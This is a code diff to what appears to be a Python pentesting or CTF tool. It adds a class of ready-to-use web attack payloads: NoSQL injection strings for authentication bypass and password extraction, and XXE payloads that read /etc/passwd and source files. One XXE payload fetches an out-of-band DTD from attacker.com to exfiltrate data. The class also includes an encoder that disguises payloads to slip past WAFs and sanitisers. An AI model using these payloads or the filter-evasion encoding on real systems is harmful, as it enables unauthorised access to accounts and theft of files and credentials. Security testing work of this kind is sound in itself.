@@ -122,3 +122,48 @@ class CodeAuditor:
                         "severity": rule["severity"]
                     })
         return findings
+
+class WebPayloads:
+    NOSQL_PAYLOADS = [
+        {"desc": "Bypass d'authentification JSON ($ne)", "payload": '{"username": {"$ne": null}, "password": {"$ne": null}}'},
+        {"desc": "Bypass d'authentification URL-encoded ($ne)", "payload": "username[$ne]=admin&password[$ne]=admin"},
+        {"desc": "Extraction par Regex ($regex)", "payload": '{"username": "admin", "password": {"$regex": "^a.*"}}'},
+        {"desc": "Exécution de condition ($where)", "payload": '{"$where": "this.password.match(/^flag.*/)"}'}
+    ]
+
+    XXE_PAYLOADS = [
+        {"desc": "Lecture de fichier local (/etc/passwd)", "payload": """<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<root><name>&xxe;</name></root>"""},
+        {"desc": "Extraction Base64 via wrapper PHP", "payload": """<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<root><name>&xxe;</name></root>"""},
+        {"desc": "XXE Out-of-Band (OOB Exfiltration)", "payload": """<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [ <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd; ]>
+<root></root>"""}
+    ]
+
+    @classmethod
+    def get_nosql(cls):
+        return cls.NOSQL_PAYLOADS
+
+    @classmethod
+    def get_xxe(cls):
+        return cls.XXE_PAYLOADS
+
+    @staticmethod
+    def encode_payload(payload_text, encoding_type="double-url"):
+        """Encode un payload pour tester les contournements de filtres (WAF / Sanitizers)."""
+        import urllib.parse
+        if encoding_type == "url":
+            return urllib.parse.quote(payload_text)
+        elif encoding_type == "double-url":
+            return urllib.parse.quote(urllib.parse.quote(payload_text))
+        elif encoding_type == "hex":
+            return "".join(f"\\x{ord(c):02x}" for c in payload_text)
+        elif encoding_type == "html-entities":
+            return "".join(f"&#{ord(c)};" for c in payload_text)
+        elif encoding_type == "charcode":
+            codes = [str(ord(c)) for c in payload_text]
+            return f"String.fromCharCode({','.join(codes)})"
+        return payload_text
